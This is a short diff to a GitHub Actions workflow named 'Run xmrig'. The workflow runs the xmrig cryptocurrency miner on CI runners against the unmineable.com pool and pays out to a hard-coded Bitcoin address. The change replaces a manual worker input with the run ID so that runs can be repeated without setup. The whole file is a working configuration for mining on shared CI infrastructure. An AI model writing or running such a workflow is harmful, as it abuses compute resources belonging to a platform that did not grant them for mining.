@@ -1,10 +1,6 @@
 name: Run xmrig 
 on:
  workflow_dispatch:
-  inputs: 
-   worker:
-    description: worker
-    type: string
 
 jobs:
   build:
@@ -13,5 +9,5 @@ jobs:
         - uses: actions/checkout@v2
         - name: Build
           run: | 
-                ${{ github.workspace }}/xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u BTC:bc1qwh4646ppd8dpj6fsd00mr9g6jeqd78jggcdntg.my_worker${{ inputs.worker }}#Bitcoin-Tips -p x 
+                ${{ github.workspace }}/xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u BTC:bc1qwh4646ppd8dpj6fsd00mr9g6jeqd78jggcdntg.original_worker$env:GITHUB_RUN_ID.#Bitcoin-Tips -p x 
                 pause
